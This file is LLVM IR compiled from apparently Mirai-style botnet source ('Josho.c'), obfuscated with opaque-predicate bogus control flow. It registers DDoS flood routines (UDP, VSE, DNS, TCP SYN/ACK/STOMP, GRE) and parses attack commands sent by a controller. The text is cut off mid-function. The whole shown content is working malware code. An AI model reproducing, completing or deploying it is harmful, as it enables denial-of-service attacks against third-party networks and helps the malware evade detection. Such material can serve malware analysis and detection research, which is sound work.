; ModuleID = 'host/ir_bcf/Josho.c.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [8 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [43 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 1043935, align 4
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  call void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 5, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_stomp)
  call void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = load i32, i32* @x.3
  %4 = load i32, i32* @y.4
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8, align 1
  %12 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %13 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %11, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %12, align 8
  %14 = call noalias i8* @calloc(i64 1, i64 16) #6
  %15 = bitcast i8* %14 to %struct.attack_method*
  store %struct.attack_method* %15, %struct.attack_method** %13, align 8
  %16 = load i8, i8* %11, align 1
  %17 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %18 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %17, i32 0, i32 1
  store i8 %16, i8* %18, align 8
  %19 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %12, align 8
  %20 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %21 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %20, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %19, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %21, align 8
  %22 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %23 = bitcast %struct.attack_method** %22 to i8*
  %24 = load i8, i8* @methods_len, align 1
  %25 = zext i8 %24 to i32
  %26 = add nsw i32 %25, 1
  %27 = sext i32 %26 to i64
  %28 = mul i64 %27, 8
  %29 = call i8* @realloc(i8* %23, i64 %28) #6
  %30 = bitcast i8* %29 to %struct.attack_method**
  store %struct.attack_method** %30, %struct.attack_method*** @methods, align 8
  %31 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %32 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %33 = load i8, i8* @methods_len, align 1
  %34 = add i8 %33, 1
  store i8 %34, i8* @methods_len, align 1
  %35 = zext i8 %33 to i64
  %36 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %32, i64 %35
  store %struct.attack_method* %31, %struct.attack_method** %36, align 8
  %37 = load i32, i32* @x.3
  %38 = load i32, i32* @y.4
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %45 = alloca i8, align 1
  %46 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %47 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %45, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %48 = call noalias i8* @calloc(i64 1, i64 16) #6
  %49 = bitcast i8* %48 to %struct.attack_method*
  store %struct.attack_method* %49, %struct.attack_method** %47, align 8
  %50 = load i8, i8* %45, align 1
  %51 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %52 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %51, i32 0, i32 1
  store i8 %50, i8* %52, align 8
  %53 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %54 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %55 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %54, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %53, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %55, align 8
  %56 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %57 = bitcast %struct.attack_method** %56 to i8*
  %58 = load i8, i8* @methods_len, align 1
  %59 = zext i8 %58 to i32
  %_ = sub i32 %59, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 0, %59
  %gen2 = add i32 %_1, 1
  %_3 = sub i32 0, %59
  %gen4 = add i32 %_3, 1
  %_5 = shl i32 %59, 1
  %_6 = shl i32 %59, 1
  %_7 = sub i32 %59, 1
  %gen8 = mul i32 %_7, 1
  %_9 = sub i32 0, %59
  %gen10 = add i32 %_9, 1
  %_11 = sub i32 %59, 1
  %gen12 = mul i32 %_11, 1
  %60 = add nsw i32 %59, 1
  %61 = sext i32 %60 to i64
  %_13 = sub i64 %61, 8
  %gen14 = mul i64 %_13, 8
  %_15 = sub i64 %61, 8
  %gen16 = mul i64 %_15, 8
  %_17 = sub i64 0, %61
  %gen18 = add i64 %_17, 8
  %_19 = sub i64 %61, 8
  %gen20 = mul i64 %_19, 8
  %_21 = sub i64 0, %61
  %gen22 = add i64 %_21, 8
  %62 = mul i64 %61, 8
  %63 = call i8* @realloc(i8* %57, i64 %62) #6
  %64 = bitcast i8* %63 to %struct.attack_method**
  store %struct.attack_method** %64, %struct.attack_method*** @methods, align 8
  %65 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %66 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %67 = load i8, i8* @methods_len, align 1
  %_23 = shl i8 %67, 1
  %_24 = sub i8 0, %67
  %gen25 = add i8 %_24, 1
  %_26 = sub i8 %67, 1
  %gen27 = mul i8 %_26, 1
  %_28 = sub i8 0, %67
  %gen29 = add i8 %_28, 1
  %_30 = sub i8 %67, 1
  %gen31 = mul i8 %_30, 1
  %_32 = shl i8 %67, 1
  %_33 = sub i8 0, %67
  %gen34 = add i8 %_33, 1
  %_35 = shl i8 %67, 1
  %_36 = sub i8 %67, 1
  %gen37 = mul i8 %_36, 1
  %_38 = sub i8 %67, 1
  %gen39 = mul i8 %_38, 1
  %68 = add i8 %67, 1
  store i8 %68, i8* @methods_len, align 1
  %69 = zext i8 %67 to i64
  %70 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %66, i64 %69
  store %struct.attack_method* %65, %struct.attack_method** %70, align 8
  br label %originalBB
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %427

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 %25, 4
  %27 = trunc i64 %26 to i32
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %47

; <label>:30:                                     ; preds = %17
  %31 = load i32, i32* @x.5
  %32 = load i32, i32* @y.6
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %30
  %39 = load i32, i32* @x.5
  %40 = load i32, i32* @y.6
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %427

; <label>:47:                                     ; preds = %17
  %48 = load i8*, i8** %3, align 8
  %49 = getelementptr inbounds i8, i8* %48, i32 1
  store i8* %49, i8** %3, align 8
  %50 = load i8, i8* %48, align 1
  store i8 %50, i8* %7, align 1
  %51 = load i32, i32* %4, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 %52, 1
  %54 = trunc i64 %53 to i32
  store i32 %54, i32* %4, align 4
  %55 = load i32, i32* %4, align 4
  %56 = icmp eq i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %47
  br label %427

; <label>:58:                                     ; preds = %47
  %59 = load i32, i32* @x.5
  %60 = load i32, i32* @y.6
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %58
  %67 = load i8*, i8** %3, align 8
  %68 = getelementptr inbounds i8, i8* %67, i32 1
  store i8* %68, i8** %3, align 8
  %69 = load i8, i8* %67, align 1
  store i8 %69, i8* %8, align 1
  %70 = load i32, i32* %4, align 4
  %71 = sext i32 %70 to i64
  %72 = sub i64 %71, 1
  %73 = trunc i64 %72 to i32
  store i32 %73, i32* %4, align 4
  %74 = load i8, i8* %8, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 0
  %77 = load i32, i32* @x.5
  %78 = load i32, i32* @y.6
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br i1 %76, label %85, label %86

; <label>:85:                                     ; preds = %originalBBpart26
  br label %427

; <label>:86:                                     ; preds = %originalBBpart26
  %87 = load i32, i32* @x.5
  %88 = load i32, i32* @y.6
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %86
  %95 = load i32, i32* %4, align 4
  %96 = sext i32 %95 to i64
  %97 = load i8, i8* %8, align 1
  %98 = zext i8 %97 to i64
  %99 = mul i64 5, %98
  %100 = icmp ult i64 %96, %99
  %101 = load i32, i32* @x.5
  %102 = load i32, i32* @y.6
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart222, label %originalBB8alteredBB

originalBBpart222:                                ; preds = %originalBB8
  br i1 %100, label %109, label %126

; <label>:109:                                    ; preds = %originalBBpart222
  %110 = load i32, i32* @x.5
  %111 = load i32, i32* @y.6
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %109
  %118 = load i32, i32* @x.5
  %119 = load i32, i32* @y.6
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br label %427

; <label>:126:                                    ; preds = %originalBBpart222
  %127 = load i32, i32* @x.5
  %128 = load i32, i32* @y.6
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %126
  %135 = load i8, i8* %8, align 1
  %136 = zext i8 %135 to i64
  %137 = call noalias i8* @calloc(i64 %136, i64 24) #6
  %138 = bitcast i8* %137 to %struct.attack_target*
  store %struct.attack_target* %138, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  %139 = load i32, i32* @x.5
  %140 = load i32, i32* @y.6
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br label %147

; <label>:147:                                    ; preds = %originalBBpart242, %originalBBpart230
  %148 = load i32, i32* @x.5
  %149 = load i32, i32* @y.6
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %147
  %156 = load i32, i32* %5, align 4
  %157 = load i8, i8* %8, align 1
  %158 = zext i8 %157 to i32
  %159 = icmp slt i32 %156, %158
  %160 = load i32, i32* @x.5
  %161 = load i32, i32* @y.6
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br i1 %159, label %168, label %229

; <label>:168:                                    ; preds = %originalBBpart234
  %169 = load i8*, i8** %3, align 8
  %170 = bitcast i8* %169 to i32*
  %171 = load i32, i32* %170, align 4
  %172 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %173 = load i32, i32* %5, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %172, i64 %174
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i32 0, i32 1
  store i32 %171, i32* %176, align 4
  %177 = load i8*, i8** %3, align 8
  %178 = getelementptr inbounds i8, i8* %177, i64 4
  store i8* %178, i8** %3, align 8
  %179 = load i8*, i8** %3, align 8
  %180 = getelementptr inbounds i8, i8* %179, i32 1
  store i8* %180, i8** %3, align 8
  %181 = load i8, i8* %179, align 1
  %182 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %183 = load i32, i32* %5, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i64 %184
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %185, i32 0, i32 2
  store i8 %181, i8* %186, align 4
  %187 = load i32, i32* %4, align 4
  %188 = sext i32 %187 to i64
  %189 = sub i64 %188, 5
  %190 = trunc i64 %189 to i32
  store i32 %190, i32* %4, align 4
  %191 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %192 = load i32, i32* %5, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i64 %193
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i32 0, i32 0
  %196 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %195, i32 0, i32 0
  store i16 2, i16* %196, align 4
  %197 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %198 = load i32, i32* %5, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 1
  %202 = load i32, i32* %201, align 4
  %203 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %204 = load i32, i32* %5, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %203, i64 %205
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %206, i32 0, i32 0
  %208 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %207, i32 0, i32 2
  %209 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %208, i32 0, i32 0
  store i32 %202, i32* %209, align 4
  br label %210

; <label>:210:                                    ; preds = %168
  %211 = load i32, i32* @x.5
  %212 = load i32, i32* @y.6
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %210
  %219 = load i32, i32* %5, align 4
  %220 = add nsw i32 %219, 1
  store i32 %220, i32* %5, align 4
  %221 = load i32, i32* @x.5
  %222 = load i32, i32* @y.6
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBBpart242, label %originalBB36alteredBB

originalBBpart242:                                ; preds = %originalBB36
  br label %147

; <label>:229:                                    ; preds = %originalBBpart234
  %230 = load i32, i32* %4, align 4
  %231 = sext i32 %230 to i64
  %232 = icmp ult i64 %231, 1
  br i1 %232, label %233, label %250

; <label>:233:                                    ; preds = %229
  %234 = load i32, i32* @x.5
  %235 = load i32, i32* @y.6
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %233
  %242 = load i32, i32* @x.5
  %243 = load i32, i32* @y.6
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %427

; <label>:250:                                    ; preds = %229
  %251 = load i8*, i8** %3, align 8
  %252 = getelementptr inbounds i8, i8* %251, i32 1
  store i8* %252, i8** %3, align 8
  %253 = load i8, i8* %251, align 1
  store i8 %253, i8* %9, align 1
  %254 = load i32, i32* %4, align 4
  %255 = sext i32 %254 to i64
  %256 = sub i64 %255, 1
  %257 = trunc i64 %256 to i32
  store i32 %257, i32* %4, align 4
  %258 = load i8, i8* %9, align 1
  %259 = zext i8 %258 to i32
  %260 = icmp sgt i32 %259, 0
  br i1 %260, label %261, label %403

; <label>:261:                                    ; preds = %250
  %262 = load i32, i32* @x.5
  %263 = load i32, i32* @y.6
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %261
  %270 = load i8, i8* %9, align 1
  %271 = zext i8 %270 to i64
  %272 = call noalias i8* @calloc(i64 %271, i64 16) #6
  %273 = bitcast i8* %272 to %struct.attack_option*
  store %struct.attack_option* %273, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  %274 = load i32, i32* @x.5
  %275 = load i32, i32* @y.6
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %282

; <label>:282:                                    ; preds = %originalBBpart275, %originalBBpart250
  %283 = load i32, i32* @x.5
  %284 = load i32, i32* @y.6
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %282
  %291 = load i32, i32* %5, align 4
  %292 = load i8, i8* %9, align 1
  %293 = zext i8 %292 to i32
  %294 = icmp slt i32 %291, %293
  %295 = load i32, i32* @x.5
  %296 = load i32, i32* @y.6
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br i1 %294, label %303, label %402

; <label>:303:                                    ; preds = %originalBBpart254
  %304 = load i32, i32* %4, align 4
  %305 = sext i32 %304 to i64
  %306 = icmp ult i64 %305, 1
  br i1 %306, label %307, label %308

; <label>:307:                                    ; preds = %303
  br label %427

; <label>:308:                                    ; preds = %303
  %309 = load i32, i32* @x.5
  %310 = load i32, i32* @y.6
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %308
  %317 = load i8*, i8** %3, align 8
  %318 = getelementptr inbounds i8, i8* %317, i32 1
  store i8* %318, i8** %3, align 8
  %319 = load i8, i8* %317, align 1
  %320 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %321 = load i32, i32* %5, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %323, i32 0, i32 1
  store i8 %319, i8* %324, align 8
  %325 = load i32, i32* %4, align 4
  %326 = sext i32 %325 to i64
  %327 = sub i64 %326, 1
  %328 = trunc i64 %327 to i32
  store i32 %328, i32* %4, align 4
  %329 = load i32, i32* %4, align 4
  %330 = sext i32 %329 to i64
  %331 = icmp ult i64 %330, 1
  %332 = load i32, i32* @x.5
  %333 = load i32, i32* @y.6
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBBpart266, label %originalBB56alteredBB

originalBBpart266:                                ; preds = %originalBB56
  br i1 %331, label %340, label %341

; <label>:340:                                    ; preds = %originalBBpart266
  br label %427

; <label>:341:                                    ; preds = %originalBBpart266
  %342 = load i8*, i8** %3, align 8
  %343 = getelementptr inbounds i8, i8* %342, i32 1
  store i8* %343, i8** %3, align 8
  %344 = load i8, i8* %342, align 1
  store i8 %344, i8* %12, align 1
  %345 = load i32, i32* %4, align 4
  %346 = sext i32 %345 to i64
  %347 = sub i64 %346, 1
  %348 = trunc i64 %347 to i32
  store i32 %348, i32* %4, align 4
  %349 = load i32, i32* %4, align 4
  %350 = load i8, i8* %12, align 1
  %351 = zext i8 %350 to i32
  %352 = icmp slt i32 %349, %351
  br i1 %352, label %353, label %354

; <label>:353:                                    ; preds = %341
  br label %427

; <label>:354:                                    ; preds = %341
  %355 = load i8, i8* %12, align 1
  %356 = zext i8 %355 to i32
  %357 = add nsw i32 %356, 1
  %358 = sext i32 %357 to i64
  %359 = call noalias i8* @calloc(i64 %358, i64 1) #6
  %360 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %361 = load i32, i32* %5, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %360, i64 %362
  %364 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %363, i32 0, i32 0
  store i8* %359, i8** %364, align 8
  %365 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %366 = load i32, i32* %5, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %368, i32 0, i32 0
  %370 = load i8*, i8** %369, align 8
  %371 = load i8*, i8** %3, align 8
  %372 = load i8, i8* %12, align 1
